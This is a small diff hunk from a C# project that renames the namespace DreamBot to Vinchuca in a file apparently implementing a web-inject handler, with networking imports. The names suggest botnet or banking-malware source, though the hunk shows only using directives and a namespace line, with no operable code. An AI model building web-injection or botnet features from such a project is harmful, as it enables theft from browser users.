@@ -3,10 +3,10 @@ using System.IO;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Text;
-using DreamBot.Network.Listeners;
-using TcpListener = DreamBot.Network.Listeners.TcpListener;
+using Vinchuca.Network.Listeners;
+using TcpListener = Vinchuca.Network.Listeners.TcpListener;
 
-namespace DreamBot.Actions.WebInject
+namespace Vinchuca.Actions.WebInject
 {
     internal class Handler
     {
